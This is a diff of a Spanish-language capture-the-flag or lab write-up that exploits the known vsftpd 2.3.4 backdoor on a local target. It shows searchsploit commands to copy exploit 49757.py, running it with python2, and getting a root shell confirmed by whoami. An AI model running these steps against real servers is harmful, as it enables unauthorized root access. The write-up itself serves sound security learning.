@@ -24,14 +24,21 @@ searchsploit vsftpd 2.3.4
 ```
 <img width="805" height="97" alt="image" src="https://github.com/user-attachments/assets/2b4d5ee0-eb3c-4bda-a795-78708cb4cfaa" />
 Vemos que hay una vulnerabilidad de backdoor.
+
 ## Explotacion
 Este exploit es conocido por poner ) a un usuario y te abre una shell en el puerto **6200/tcp**
+
 Nos copiamos el exploit.
-```
+```bash
 searchsploit -m 49757.py
 ```
 Y lo ejecutamos.
+```bash
+python2 49757.py 127.17.0.2
 ```
-python3 49757.py 127.17.0.2
+Y nos entra en la shell, usamos un ```whoami``` para ver si somos root.
+```bash
+whoami
+# root
 ```
-
+Maquina resuelta - Se accede a root.
